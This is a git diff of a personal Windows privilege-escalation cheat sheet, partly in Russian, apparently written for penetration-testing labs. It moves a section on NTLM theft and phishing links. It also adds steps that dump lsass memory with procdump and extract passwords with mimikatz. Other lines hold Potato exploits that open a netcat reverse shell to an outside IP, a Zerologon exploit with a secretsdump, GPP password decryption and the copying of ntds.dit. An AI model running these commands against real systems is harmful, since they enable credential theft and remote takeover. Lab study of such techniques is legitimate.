@@ -164,6 +164,24 @@ https://github.com/antonioCoco/RunasCs
 
     ./RunasCs.exe x x tasklist -l 9
 
+# NTML atack
+
+---Создание ярлыков
+
+https://github.com/Greenwolf/ntlm_theft
+
+# Сщздание вредноносных ссылок
+
+https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-ole-+-lnk
+
+
+# Расшифровка учетных записей
+https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators
+
+# Расшифровка пароля аес256 из GROUP.xmls
+
+gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ     где edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ - зашифрованый пароль
+
 # SeLoadDriverPrivelege
 
 POC -->compile
@@ -178,8 +196,6 @@ https://github.com/tandasat/ExploitCapcom  --> add reverseshell!!!!!!
 -->> .\LoadDriver.exe System\CurrentControlSet\hack C:\Users\svc-print\capcom.sys
 -->> .\ExploitCapcom.exe (change shell)
 
-
-
 reverse shell c#
 https://www.puckiestyle.nl/c-simple-reverse-shell/ ----> C:\windows\microsoft.net\framework64\v4.0.30319> .\csc.exe ---> 
 
@@ -188,24 +204,6 @@ https://www.puckiestyle.nl/c-simple-reverse-shell/ ----> C:\windows\microsoft.ne
 python3 cve-2020-1472-exploit.py fuse 10.10.10.193 (проверка на уязвимость)
 
 impacket-secretsdump -just-dc -no-pass fuse\$@10.10.10.193
-
-# NTML atack
-
----Создание ярлыков
-
-https://github.com/Greenwolf/ntlm_theft
-# Сщздание вредноносных ссылок
-
-https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-ole-+-lnk
-
-
-# Расшифровка учетных записей
-https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators
-
-# Расшифровка пароля аес256 из GROUP.xmls
-
-gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ     где edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ - зашифрованый пароль
-
 
 # Токен имперсонейшн
 
@@ -218,7 +216,7 @@ Now, in the "local service" reverse shell you triggered, run the RoguePotato exp
 C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
 
 
-# SeImpersonatePrivilege (Potato)
+# SeImpersonate and SeAssignPrimaryToken (Potato)
    
     https://github.com/ohpe/juicy-potato/releases
 
@@ -260,6 +258,7 @@ C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
     nc -lnvp 9001
 
 # RoguePotato
+
     https://github.com/antonioCoco/RoguePotato
     RoguePotato.exe -r 10.10.16.21 -e "c:\tools\nc.exe 10.10.16.21 9001 -e cmd" -l 9999
     
@@ -283,7 +282,13 @@ C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
 3    diskshadow /s diskshadow.txt
      robocopy /b e:\windows\ntds . ntds.dit
 
+# SeDebugPrivilege
+    procdump.exe -accepteula -ma lsass.exe lsass.dmp
 
+    sekurlsa::minidump lsass.dmp
+    sekurlsa::logonpasswords
+    
+    
 # Подсказки для виндовс
 
 # https://github.com/davidbombal/Ethical-Hacking/blob/main/Windows%20Pentesting%20with%20OffSec
